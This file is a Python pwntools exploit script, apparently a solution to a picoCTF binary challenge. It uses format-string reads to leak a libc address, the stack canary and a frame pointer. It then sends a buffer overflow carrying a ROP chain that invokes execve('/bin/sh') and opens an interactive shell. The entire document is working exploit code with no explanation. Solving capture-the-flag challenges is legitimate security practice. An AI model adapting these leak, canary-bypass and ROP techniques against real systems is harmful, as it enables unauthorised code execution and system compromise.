from pwn import *
import random


if args.REMOTE:
    r = remote("jupiter.challenges.picoctf.org", 18263)
    ans = -3727
elif args.LOCAL:
    r = process("./V", env={"LD_PRELOAD" : "./libc-2.27.so"})
    # r = process('./vuln')
    # ans = -3615
    ans = -3727

'''#############
Find Libc address by stack info
#############'''
r.recvuntil(b'What number would you like to guess?\n')
r.sendline(str(ans).encode())
r.recvuntil(b'Name? ')
r.sendline(b"%147$p")
r.recvuntil(b"Congrats: 0x")
__libc_start_main = int(r.recvuntil(b"\n").strip().decode(), 16)
libc_addr = __libc_start_main - 0x018fa1
libc_system_addr = libc_addr + 0x03cf10
success(f"libc base address = {hex(libc_addr)}")
success(f"libc system address = {hex(libc_system_addr)}")
# raw_input()

'''#############
Find Canary Value
#############'''
r.recvuntil(b'What number would you like to guess?\n')
r.sendline(str(ans).encode())
r.recvuntil(b'Name? ')
r.sendline(b"%135$p")
r.recvuntil(b"Congrats: 0x")
canary_value = int(r.recvuntil(b"\n").strip().decode(), 16)
success(f"Canary Value = {hex(canary_value)}")
# raw_input()

'''#############
Get Shell
#############'''
r.recvuntil(b'What number would you like to guess?\n')
r.sendline(str(ans).encode())
r.recvuntil(b'Name? ')
r.sendline(b"%138$p")
r.recvuntil(b"Congrats: ")
ebp_addr = int(r.recvuntil(b"\n").strip().decode(), 16)
success(f"ebp address = {hex(ebp_addr)}")
# raw_input()

bin_sh_1 = 0x6e69622f
bin_sh_2 = 0x68732f
pop_eax_ret = 0x00024d37 + libc_addr
pop_ebx_ret = 0x00018d05 + libc_addr
pop_ecx_ret = 0x00193aa4 + libc_addr
pop_edx_ret = 0x00001aae + libc_addr
int_0x80 = 0x00002d3f + libc_addr

ROP_payload = flat(
    pop_eax_ret, 0xb,
    pop_ebx_ret, (ebp_addr+0x8),
    pop_ecx_ret, 0,
    pop_edx_ret, 0,
    int_0x80,
    bin_sh_1, bin_sh_2
)
r.recvuntil(b'What number would you like to guess?\n')
r.sendline(str(ans).encode())
r.recvuntil(b'Name? ')
r.sendline(b'a' * (0x200) + p32(canary_value) + b'a' * 0xc + ROP_payload)
# raw_input()
r.interactive()